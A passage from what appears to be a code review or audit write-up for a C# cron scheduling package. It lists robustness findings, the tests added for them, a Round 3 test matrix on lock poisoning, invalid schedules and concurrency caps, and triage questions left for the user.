| R3-L3 | Low | **Fixed.** `Add` + `GetOrAddInfrastructure` guarded by locks; `Jobs` returns a snapshot. | `SparkCronJobRegistry.cs`, `SparkCronExtensions.cs` |

Test coverage added: `AddJob_throws_when_the_schedule_is_unparseable` (Theory), `AddJob_accepts_a_valid_but_never_occurring_expression`, `A_never_occurring_schedule_disables_only_its_own_loop`, `A_concurrent_job_that_overruns_is_capped_at_the_max_in_flight`, `A_poisoned_far_future_claim_value_is_reclaimed_not_honored`, `An_unparseable_claim_value_is_reclaimed_not_honored`.

### 10.7 Test matrix (Round 3)

| # | Finding | Test name | Assertion |
|---|---------|-----------|-----------|
| T1 | R3-M1 | `Poisoned_far_future_claim_value_does_not_silently_disable_job` | Seed `cron/Job`=year-2999 → next occurrence still claimed/run by one node OR Warning emitted |
| T2 | R3-M1 | `Corrupt_claim_value_is_treated_as_untrusted` | Seed garbage value → Warning + reclaim, not silent skip |
| T3 | R3-M2 | `AddJob_with_invalid_cron_throws_at_registration` | `AddJob<T>("xyz")` → `ArgumentException` (not a runtime log-only no-op) |
| T4 | R3-M2 | `Never_occurring_schedule_disables_only_its_own_loop` | `0 0 30 2 *` → Warning + that loop ends, scheduler stays healthy |
| T5 | R3-M3 | `Concurrent_overrunning_job_is_capped` | `RunAsync` longer than interval → in-flight runs ≤ documented cap |
| T6 | R3-L2 | `Resolved_cron_precision_is_logged` | `*/30 * * * *` → logged next-occurrence ≈ 30 min |
| T7 | R3-L3 | `Concurrent_duplicate_registration_is_rejected` | N concurrent `Add` same name → exactly one succeeds, rest throw |

### 10.8 Triage questions (for the user)

1. **Bundle with the R2 PR or a separate follow-up?** Round 3 has no Critical/High; it's 3 Mediums + 3 Lows confined to the new cron package. Cleanest as a small dedicated `fix(cron)` commit on this branch (tests-first, same shape as R2).
2. **R3-M1 framing** — is cron lock-poisoning in-threat-model given there's no reachable compare-exchange write path today? If treated as pure robustness/observability, the heartbeat + Warning-escalation parts are the high-value pieces and the value-validation is defense-in-depth.
3. **R3-M2** — fail-fast at registration (recommended) vs. keep runtime-only but escalate to Warning + disable. Fail-fast is consistent with the existing whitespace check.
4. **R3-L1** — documentation-only, or also ship an opt-in principal/tenant-scoping hook for cron jobs?
